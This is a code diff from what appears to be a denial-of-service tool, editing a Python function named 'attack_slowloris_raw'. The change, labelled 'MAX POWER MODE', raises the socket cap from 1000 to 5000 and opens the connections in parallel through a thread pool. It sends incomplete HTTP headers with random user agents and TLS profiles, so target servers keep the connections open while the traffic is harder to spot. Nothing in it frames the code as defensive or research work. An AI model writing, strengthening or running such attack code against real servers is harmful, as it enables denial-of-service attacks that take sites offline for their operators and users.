@@ -785,6 +785,8 @@ async def attack_slowloris_raw(url: str, proxy: Optional[str], session_pool: Opt
     Uses minimal socket buffers to prevent Windows Winsock queue saturation
     
     metrics_out: If provided, updated in real-time during attack
+    
+    MAX POWER MODE: parallel connect via thread pool (was sequential)
     """
     metrics = metrics_out if metrics_out is not None else {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
     for k in ("completed", "failed", "timeout", "total"):
@@ -796,40 +798,42 @@ async def attack_slowloris_raw(url: str, proxy: Optional[str], session_pool: Opt
     port = parsed.port or (443 if parsed.scheme == "https" else 80)
     is_ssl = parsed.scheme == "https"
 
-    max_socks = min(target_rps, MAX_CONCURRENT)
-    sockets = []
-    for _ in range(max_socks):
+    # MAX POWER: scale concurrency higher (was MAX_CONCURRENT=1000 cap)
+    max_socks = min(target_rps, 5000)
+    
+    def _connect_one():
+        """Synchronous connect helper - runs in thread pool for true parallelism"""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            # Configure minimal buffers (prevents Winsock saturation)
             _configure_socket(sock)
             sock.settimeout(4)
             sock.connect((host, port))
             if is_ssl:
-                context, tls_profile = get_random_ssl_context()
+                context, _tls_profile = get_random_ssl_context()
                 sock = context.wrap_socket(sock, server_hostname=host)
             
-            # Minimal headers only (Host, User-Agent, Accept)
             user_agent = random.choice(USER_AGENTS)
             sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
             sock.send(f"Host: {host}\r\n".encode())
             sock.send(f"User-Agent: {user_agent}\r\n".encode())
             sock.send(f"Accept: */*\r\n".encode())
-            sockets.append(sock)
+            return sock
+        except Exception:
+            return None
+    
+    # PARALLEL CONNECT: spawn all sockets in thread pool simultaneously
+    loop = asyncio.get_event_loop()
+    connect_tasks = [loop.run_in_executor(None, _connect_one) for _ in range(max_socks)]
+    sockets_raw = await asyncio.gather(*connect_tasks, return_exceptions=True)
+    
+    sockets = []
+    for s in sockets_raw:
+        if isinstance(s, Exception) or s is None:
+            metrics["failed"] += 1
+            metrics["total"] += 1
+        else:
+            sockets.append(s)
             metrics["completed"] += 1
-            metrics["total"] += 1
-        except BlockingIOError as e:
-            # Windows buffer saturation - yield briefly
-            if await _handle_socket_block(e):
-                continue
-            metrics["failed"] += 1
-            metrics["total"] += 1
-        except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError, OSError) as e:
-            # Check if it's a buffer issue
-            if await _handle_socket_block(e):
-                continue
-            logger.debug(f"Slowloris socket error: {type(e).__name__}")
-            metrics["failed"] += 1
             metrics["total"] += 1
 
     # Adaptive keep-alive interval based on duration
